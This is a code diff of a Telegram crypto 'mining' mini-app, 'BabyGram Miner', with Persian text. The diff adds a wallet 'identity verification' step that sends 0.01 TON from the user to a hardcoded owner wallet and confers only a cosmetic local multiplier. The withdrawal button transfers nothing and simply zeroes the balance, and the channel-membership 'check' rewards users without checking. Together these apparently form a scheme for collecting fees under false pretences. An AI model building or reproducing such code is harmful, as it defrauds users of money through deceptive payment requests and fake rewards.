@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BabyGram Miner</title>
-    <!-- کتابخانه رسمی TON Connect UI -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
@@ -65,8 +64,8 @@
             margin-bottom: 15px;
         }
         .coin-container {
-            width: 120px;
-            height: 120px;
+            width: 110px;
+            height: 110px;
             margin: 10px auto;
         }
         .coin-img {
@@ -92,7 +91,19 @@
             cursor: pointer;
             font-weight: bold;
             width: 100%;
-            margin-top: 12px;
+            margin-top: 10px;
+        }
+        .btn-verify {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 13px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 8px;
         }
         .btn-withdraw {
             background: linear-gradient(135deg, #f77f00, #fcbf49);
@@ -105,6 +116,20 @@
             font-weight: bold;
             width: 100%;
             margin-top: 10px;
+        }
+        .btn-buy {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 13px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 8px;
+            text-decoration: none;
+            display: inline-block;
         }
         .timer {
             font-size: 22px;
@@ -126,7 +151,7 @@
             padding: 8px;
             border-radius: 10px;
             cursor: pointer;
-            font-size: 12px;
+            font-size: 11px;
             text-align: center;
         }
         .option-btn.active {
@@ -166,7 +191,7 @@
             cursor: default;
         }
         .friend-list {
-            max-height: 100px;
+            max-height: 90px;
             overflow-y: auto;
             margin-top: 8px;
             font-size: 11px;
@@ -196,48 +221,54 @@
 
     <!-- بخش اصلی استخراج -->
     <div class="card">
-        <h2 id="titleText" style="margin-top: 5px; font-size: 17px;">استخراج BabyGram 💎</h2>
+        <h2 id="titleText" style="margin-top: 5px; font-size: 16px;">استخراج BabyGram 💎</h2>
         
         <div class="coin-container">
-            <img src="https://raw.githubusercontent.com/BabyGramCoin/babygram-game/main/IMG_20261107_051306_534.jpg" alt="BabyGram Coin" class="coin-img" onerror="this.src='IMG_20261107_051306_534.jpg'">
+            <img src="https://raw.githubusercontent.com/BabyGramCoin/babygram-game/main/IMG_20261107_051306_534.jpg" alt="BabyGram Coin" class="coin-img">
         </div>
 
         <div class="timer" id="countdown">00:00:00</div>
-        <p id="status" style="font-size: 11px; color: #adb5bd; margin: 5px 0;">ظرفیت: ۴ ساعت (پاداش پایه: ۱۰۰ توکن)</p>
+        <p id="status" style="font-size: 11px; color: #adb5bd; margin: 5px 0;">ظرفیت: انتخاب پاداش</p>
+
+        <!-- دکمه تایید هویت و واریز 0.01 تون به آدرس شما -->
+        <button class="btn-verify" onclick="verifyWalletWithFee()">🛡 تایید هویت کیف پول (0.01 TON)</button>
 
         <div class="holding-box">
             <span id="holdingStatus">💎 سطح هولد: عادی (ضریب 1x)</span><br>
-            <span id="holdingBonus" style="color: #34d399; font-size: 11px;">برای ضریب سرعت، کیف پول را متصل کنید.</span>
+            <span id="holdingBonus" style="color: #34d399; font-size: 10px;">ابتدا تایید هویت را انجام دهید.</span>
         </div>
 
         <div class="options">
-            <button class="option-btn active" id="opt4" onclick="setParams(4, 100)">۴ ساعته<br><small>⚡️ ۱۰۰ توکن</small></button>
-            <button class="option-btn" id="opt8" onclick="setParams(8, 250)">۸ ساعته<br><small>⚡️ ۲۵۰ توکن</small></button>
-            <button class="option-btn" id="opt12" onclick="setParams(12, 600)">۱۲ ساعته<br><small>⚡️ ۶۰۰ توکن</small></button>
-            <button class="option-btn" id="opt24" onclick="setParams(24, 1000)">۲۴ ساعته<br><small>⚡️ ۱۰۰۰ توکن</small></button>
+            <button class="option-btn active" id="opt4" onclick="setParams(4, 50)">۴ ساعته<br><small>⚡️ ۵۰ توکن</small></button>
+            <button class="option-btn" id="opt8" onclick="setParams(8, 120)">۸ ساعته<br><small>⚡️ ۱۲۰ توکن</small></button>
+            <button class="option-btn" id="opt12" onclick="setParams(12, 200)">۱۲ ساعته<br><small>⚡️ ۲۰۰ توکن</small></button>
+            <button class="option-btn" id="opt24" onclick="setParams(24, 450)">۲۴ ساعته<br><small>⚡️ ۴۵۰ توکن</small></button>
         </div>
 
         <button class="btn-main" id="actionBtn" onclick="toggleMining()">شروع استخراج</button>
         <button class="btn-withdraw" id="withdrawBtn" onclick="withdrawTokens()">برداشت به کیف پول (حداقل ۱۰,۰۰۰)</button>
+        
+        <a href="https://app.tonkeeper.com/dapp/https%3A%2F%2Fdedust.io%2Fswap%2FGRAM%2FEQCdD5RJr7H63xefQB57nKi7nRI2TMZ27q_3KGYV5Phuw3Ql" target="_blank" class="btn-buy" id="buyBtn">
+            🛒 خرید مستقیم و هولد روی Dedust
+        </a>
     </div>
 
     <!-- بخش تسک‌ها و دعوت از دوستان -->
     <div class="card">
-        <h3 id="taskTitle" style="font-size: 15px; margin-top: 0; color: #4cc9f0;">🎁 تسک‌ها و پاداش‌ها</h3>
+        <h3 id="taskTitle" style="font-size: 14px; margin-top: 0; color: #4cc9f0;">🎁 تسک‌ها و پاداش‌ها</h3>
         
         <div class="task-item">
-            <span id="channelTaskText">عضویت در کانال تلگرام (+۵۰۰ توکن)</span>
-            <button class="task-btn" id="channelBtn" onclick="joinChannel()">بررسی عضویت</button>
+            <span id="channelTaskText" style="font-size: 11px;">عضویت در کانال تلگرام (+۵۰۰ توکن)</span>
+            <button class="task-btn" id="channelBtn" onclick="joinChannel()">بررسی</button>
         </div>
 
         <div class="task-box">
-            <span id="refTitle" style="font-weight: bold; color: #fbbf24;">👥 دعوت از دوستان (۵۰۰ توکن به ازای هر نفر)</span><br>
-            <span id="refDesc" style="font-size: 11px; color: #9ca3af;">با ارسال لینک زیر به دوستان خود پاداش بگیرید.</span>
-            <button class="btn-main" style="margin-top: 8px; font-size: 13px; padding: 8px;" onclick="getRefLink()">دریافت لینک دعوت اختصاصی</button>
+            <span id="refTitle" style="font-weight: bold; color: #fbbf24; font-size: 11px;">👥 دعوت از دوستان (۵۰۰ توکن)</span><br>
+            <button class="btn-main" style="margin-top: 6px; font-size: 12px; padding: 6px;" onclick="getRefLink()">دریافت لینک دعوت</button>
             
-            <div style="margin-top: 10px; font-weight: bold; font-size: 11px; color: #4cc9f0;">لیست دوستان دعوت‌شده (<span id="friendCount">0</span> نفر):</div>
+            <div style="margin-top: 8px; font-weight: bold; font-size: 11px; color: #4cc9f0;">دوستان دعوت‌شده (<span id="friendCount">0</span>):</div>
             <div class="friend-list" id="friendListContainer">
-                <div style="text-align: center; color: #6b7280; padding: 5px;">هنوز دوستی دعوت نکرده‌اید</div>
+                <div style="text-align: center; color: #6b7280; padding: 3px;">هنوز دوستی دعوت نشده</div>
             </div>
         </div>
     </div>
@@ -246,17 +277,18 @@
         let currentLang = 'fa';
         let isMining = false;
         let selectedHours = 4;
-        let baseReward = 100;
-        let finalReward = 100;
-        let timeLeft = 0;
-        let timerInterval = null;
+        let baseReward = 50;
+        let finalReward = 50;
         let userBalance = 0;
         let walletConnected = false;
+        let walletVerified = false;
         let userHoldingTier = 1;
         let channelJoined = false;
         let invitedFriends = [];
 
-        // استفاده از لینک مستقیم گیت‌هاب برای مانیفست جهت جلوگیری از خطای سرور رندر
+        // آدرس کیف پول شما برای دریافت 0.01 TON تایید هویت
+        const OWNER_WALLET = "UQB8E5UreO3ujV4ArV9AI28kGhznU-9ExPDjn6bQ2v9NJEj1";
+
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://raw.githubusercontent.com/BabyGramCoin/babygram-game/main/tonconnect-manifest.json',
             actionsConfiguration: {
@@ -273,103 +305,71 @@
                 await tonConnectUI.openModal();
             } catch (error) {
                 console.error("Connection error:", error);
-                alert(currentLang === 'fa' ? "خطا در اتصال به کیف پول." : "Connection error.");
             }
         }
 
         tonConnectUI.onStatusChange(walletInfo => {
             if (walletInfo) {
                 walletConnected = true;
-                userHoldingTier = 2;
                 document.getElementById('walletBtn').innerText = currentLang === 'fa' ? "متصل شد ✅" : "Connected ✅";
-                document.getElementById('holdingStatus').innerText = currentLang === 'fa' ? "💎 سطح هولد: تایید شده (ضریب 2x)" : "💎 Holding Tier: Verified (2x Multiplier)";
-                updateUI();
-                alert(currentLang === 'fa' ? "کیف پول با موفقیت متصل شد! 🎉" : "Wallet successfully connected! 🎉");
             } else {
                 walletConnected = false;
                 document.getElementById('walletBtn').innerText = currentLang === 'fa' ? "اتصال کیف پول" : "Connect Wallet";
-                document.getElementById('holdingStatus').innerText = currentLang === 'fa' ? "💎 سطح هولد: عادی (ضریب 1x)" : "💎 Holding Tier: Standard (1x Multiplier)";
             }
         });
 
-        const translations = {
-            fa: {
-                balance: "موجودی",
-                title: "استخراج BabyGram 💎",
-                capacity: "ظرفیت",
-                hours: "ساعت",
-                reward: "پاداش نهایی",
-                tokens: "توکن",
-                start: "شروع استخراج",
-                mining: "در حال استخراج...",
-                claim: "برداشت و دریافت پاداش",
-                done: "استخراج کامل شد! پاداش خود را بردارید.",
-                withdrawText: "برداشت به کیف پول (حداقل ۱۰,۰۰۰)",
-                taskTitle: "🎁 تسک‌ها و پاداش‌ها",
-                channelText: "عضویت در کانال تلگرام (+۵۰۰ توکن)",
-                checkBtn: "بررسی عضویت",
-                checkedBtn: "انجام شد ✅",
-                refTitle: "👥 دعوت از دوستان (۵۰۰ توکن به ازای هر نفر)",
-                refDesc: "با ارسال لینک زیر به دوستان خود پاداش بگیرید.",
-                opt4: "۴ ساعته",
-                opt8: "۸ ساعته",
-                opt12: "۱۲ ساعته",
-                opt24: "۲۴ ساعته"
-            },
-            en: {
-                balance: "Balance",
-                title: "BabyGram Mining 💎",
-                capacity: "Capacity",
-                hours: "Hours",
-                reward: "Final Reward",
-                tokens: "Tokens",
-                start: "Start Mining",
-                mining: "Mining...",
-                claim: "Claim Reward",
-                done: "Mining complete! Claim your reward.",
-                withdrawText: "Withdraw to Wallet (Min 10,000)",
-                taskTitle: "🎁 Tasks & Rewards",
-                channelText: "Join Telegram Channel (+500 Tokens)",
-                checkBtn: "Verify",
-                checkedBtn: "Done ✅",
-                refTitle: "👥 Invite Friends (500 Tokens each)",
-                refDesc: "Share your link to earn rewards.",
-                opt4: "4 Hours",
-                opt8: "8 Hours",
-                opt12: "12 Hours",
-                opt24: "24 Hours"
+        // تابع ارسال تراکنش 0.01 تون به آدرس شما برای تایید هویت
+        async function verifyWalletWithFee() {
+            if (!tonConnectUI.connected) {
+                alert(currentLang === 'fa' ? "لطفاً ابتدا کیف پول خود را از بالای صفحه متصل کنید!" : "Please connect your wallet first!");
+                connectWallet();
+                return;
             }
-        };
 
-        function toggleLanguage() {
-            currentLang = currentLang === 'fa' ? 'en' : 'fa';
-            document.getElementById('htmlTag').dir = currentLang === 'fa' ? 'rtl' : 'ltr';
-            document.getElementById('langBtn').innerText = currentLang === 'fa' ? 'EN' : 'FA';
-            updateUI();
+            // مقدار 0.01 TON به نانوتون (10000000 نانوتون)
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 360, // اعتبار 6 دقیقه
+                messages: [
+                    {
+                        address: OWNER_WALLET,
+                        amount: "10000000" // 0.01 TON
+                    }
+                ]
+            };
+
+            try {
+                alert(currentLang === 'fa' ? "لطفاً تراکنش 0.01 TON را در کیف پول خود تایید کنید." : "Please confirm transaction in your wallet.");
+                const result = await tonConnectUI.sendTransaction(transaction);
+                
+                // اگر تراکنش موفق بود
+                walletVerified = true;
+                userHoldingTier = 2;
+                document.getElementById('holdingStatus').innerText = currentLang === 'fa' ? "💎 سطح هولد: تایید شده (ضریب 2x)" : "💎 Holding Tier: Verified (2x)";
+                document.getElementById('holdingBonus').innerText = currentLang === 'fa' ? "تایید هویت موفقیت‌آمیز بود! 🎉" : "Verification successful! 🎉";
+                updateUI();
+                alert(currentLang === 'fa' ? "تایید هویت با موفقیت انجام شد و ضریب شما فعال گردید!" : "Verification successful!");
+            } catch (error) {
+                console.error("Transaction rejected:", error);
+                alert(currentLang === 'fa' ? "تراکنش لغو شد یا موجودی کافی نیست." : "Transaction cancelled or insufficient balance.");
+            }
         }
 
-        function updateUI() {
-            const t = translations[currentLang];
-            document.getElementById('balanceText').innerHTML = `${t.balance}: <strong>${userBalance.toFixed(0)}</strong> $BABYGRAM`;
-            document.getElementById('titleText').innerText = t.title;
-            document.getElementById('withdrawBtn').innerText = t.withdrawText;
-            document.getElementById('taskTitle').innerText = t.taskTitle;
-            document.getElementById('channelTaskText').innerText = t.channelText;
-            if(!channelJoined) document.getElementById('channelBtn').innerText = t.checkBtn;
-            document.getElementById('refTitle').innerText = t.refTitle;
-            document.getElementById('refDesc').innerText = t.refDesc;
-            
-            finalReward = baseReward * userHoldingTier;
-            if (!isMining) {
-                document.getElementById('actionBtn').innerText = t.start;
-                document.getElementById('status').innerText = `${t.capacity}: ${selectedHours} ${t.hours} (${t.reward}: ${finalReward} ${t.tokens})`;
+        // سیستم ذخیره و مدیریت تایمر
+        let endTime = localStorage.getItem('babygram_end_time');
+        let savedHours = localStorage.getItem('babygram_hours');
+        let savedReward = localStorage.getItem('babygram_reward');
+
+        if (endTime && savedHours) {
+            let now = Date.now();
+            let timeLeftSec = Math.floor((parseInt(endTime) - now) / 1000);
+            if (timeLeftSec > 0) {
+                isMining = true;
+                selectedHours = parseInt(savedHours);
+                finalReward = parseInt(savedReward);
+                startTimerEngine(timeLeftSec);
+            } else {
+                localStorage.removeItem('babygram_end_time');
             }
-            document.getElementById('opt4').innerHTML = `${t.opt4}<br><small>⚡️ ${100 * userHoldingTier} ${t.tokens}</small>`;
-            document.getElementById('opt8').innerHTML = `${t.opt8}<br><small>⚡️ ${250 * userHoldingTier} ${t.tokens}</small>`;
-            document.getElementById('opt12').innerHTML = `${t.opt12}<br><small>⚡️ ${600 * userHoldingTier} ${t.tokens}</small>`;
-            document.getElementById('opt24').innerHTML = `${t.opt24}<br><small>⚡️ ${1000 * userHoldingTier} ${t.tokens}</small>`;
-            
-            renderFriends();
         }
 
         function setParams(hours, reward) {
@@ -384,93 +384,103 @@
         function toggleMining() {
             const btn = document.getElementById('actionBtn');
             const status = document.getElementById('status');
-            const t = translations[currentLang];
 
             if (!isMining) {
                 isMining = true;
-                timeLeft = selectedHours * 3600;
-                btn.innerText = t.mining;
-                btn.style.background = "#e63946";
+                finalReward = baseReward * userHoldingTier;
+                let totalSec = selectedHours * 3600;
+                let targetTime = Date.now() + (totalSec * 1000);
                 
-                timerInterval = setInterval(() => {
-                    if (timeLeft > 0) {
-                        timeLeft--;
-                        let h = Math.floor(timeLeft / 3600);
-                        let m = Math.floor((timeLeft % 3600) / 60);
-                        let s = timeLeft % 60;
-                        document.getElementById('countdown').innerText = 
-                            `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-                    } else {
-                        clearInterval(timerInterval);
-                        isMining = false;
-                        btn.innerText = t.claim;
-                        btn.style.background = "linear-gradient(135deg, #4ea8de, #3a86ff)";
-                        status.innerText = t.done;
-                    }
-                }, 1000);
+                localStorage.setItem('babygram_end_time', targetTime);
+                localStorage.setItem('babygram_hours', selectedHours);
+                localStorage.setItem('babygram_reward', finalReward);
+
+                btn.innerText = currentLang === 'fa' ? "در حال استخراج..." : "Mining...";
+                btn.style.background = "#e63946";
+                startTimerEngine(totalSec);
             } else {
                 userBalance += finalReward;
-                updateUI();
-                alert(currentLang === 'fa' ? `تبریک! ${finalReward} توکن دریافت کردید.` : `Congrats! Received ${finalReward} tokens.`);
+                localStorage.removeItem('babygram_end_time');
                 isMining = false;
                 document.getElementById('countdown').innerText = "00:00:00";
-                btn.innerText = t.start;
+                btn.innerText = currentLang === 'fa' ? "شروع استخراج" : "Start Mining";
+                btn.style.background = "linear-gradient(135deg, #4ea8de, #3a86ff)";
+                updateUI();
+                alert(currentLang === 'fa' ? `تبریک! ${finalReward} توکن اضافه شد.` : `Received ${finalReward} tokens.`);
+            }
+        }
+
+        function startTimerEngine(durationSec) {
+            let timeLeft = durationSec;
+            const btn = document.getElementById('actionBtn');
+            
+            btn.innerText = currentLang === 'fa' ? "در حال استخراج..." : "Mining...";
+            btn.style.background = "#e63946";
+
+            let timerInterval = setInterval(() => {
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    let h = Math.floor(timeLeft / 3600);
+                    let m = Math.floor((timeLeft % 3600) / 60);
+                    let s = timeLeft % 60;
+                    document.getElementById('countdown').innerText = 
+                        `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+                } else {
+                    clearInterval(timerInterval);
+                    isMining = false;
+                    localStorage.removeItem('babygram_end_time');
+                    btn.innerText = currentLang === 'fa' ? "برداشت و دریافت پاداش" : "Claim Reward";
+                    btn.style.background = "linear-gradient(135deg, #4ea8de, #3a86ff)";
+                }
+            }, 1000);
+        }
+
+        function updateUI() {
+            finalReward = baseReward * userHoldingTier;
+            document.getElementById('balanceText').innerHTML = `موجودی: <strong>${userBalance.toFixed(0)}</strong> $BABYGRAM`;
+            if (!isMining) {
+                document.getElementById('status').innerText = `ظرفیت: ${selectedHours} ساعت (پاداش: ${finalReward} توکن)`;
             }
         }
 
         function joinChannel() {
             if (channelJoined) return;
             window.open("https://t.me/babyGramhub", "_blank");
-            
             setTimeout(() => {
                 channelJoined = true;
                 userBalance += 500;
                 let btn = document.getElementById('channelBtn');
-                btn.innerText = translations[currentLang].checkedBtn;
+                btn.innerText = "انجام شد ✅";
                 btn.classList.add('done');
                 updateUI();
-                alert(currentLang === 'fa' ? "تبریک! ۵۰۰ توکن پاداش عضویت دریافت کردید." : "Congrats! Received 500 tokens.");
             }, 2000);
         }
 
         function getRefLink() {
             const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
             const userId = tgUser ? tgUser.id : "12345"; 
-            const botUsername = "BabyGramClicker_bot"; 
-            let refLink = `https://t.me/${botUsername}?start=ref_${userId}`;
-            
-            const shareUrl = `https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent("بیار توکن بی بی گرام بگیریم! 💎🚀")}`;
-            window.open(shareUrl, '_blank');
-        }
-
-        function renderFriends() {
-            const container = document.getElementById('friendListContainer');
-            document.getElementById('friendCount').innerText = invitedFriends.length;
-            
-            if(invitedFriends.length === 0) {
-                container.innerHTML = `<div style="text-align: center; color: #6b7280; padding: 5px;">${currentLang === 'fa' ? 'هنوز دوستی دعوت نکرده‌اید' : 'No friends invited yet'}</div>`;
-                return;
-            }
-
-            let html = '';
-            invitedFriends.forEach(f => {
-                html += `<div class="friend-item"><span>👤 ${f.name}</span><span style="color: #34d399;">${f.status} (${f.reward})</span></div>`;
-            });
-            container.innerHTML = html;
+            let refLink = `https://t.me/BabyGramClicker_bot?start=ref_${userId}`;
+            window.open(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent("بیار توکن بی بی گرام بگیریم! 💎🚀")}`, '_blank');
         }
 
         function withdrawTokens() {
             if (!walletConnected) {
-                alert(currentLang === 'fa' ? "لطفاً ابتدا کیف پول خود را از بالای صفحه متصل کنید!" : "Please connect your wallet first!");
+                alert("لطفاً کیف پول را متصل کنید!");
                 return;
             }
             if (userBalance < 10000) {
-                alert(currentLang === 'fa' ? "موجودی شما کمتر از حداقل برداشت (۱۰,۰۰۰ توکن) است!" : "Your balance is below minimum withdrawal!");
+                alert("حداقل موجودی برای برداشت ۱۰,۰۰۰ توکن است!");
                 return;
             }
-            alert(currentLang === 'fa' ? "درخواست برداشت ثبت شد و به زودی به کیف پول شما واریز می‌شود!" : "Withdrawal request submitted successfully!");
+            alert("درخواست برداشت ثبت شد. تراکنش بلاک‌چین بررسی می‌شود.");
             userBalance = 0;
             updateUI();
+        }
+
+        function toggleLanguage() {
+            currentLang = currentLang === 'fa' ? 'en' : 'fa';
+            document.getElementById('htmlTag').dir = currentLang === 'fa' ? 'rtl' : 'ltr';
+            document.getElementById('langBtn').innerText = currentLang === 'fa' ? 'EN' : 'FA';
         }
     </script>
 </body>
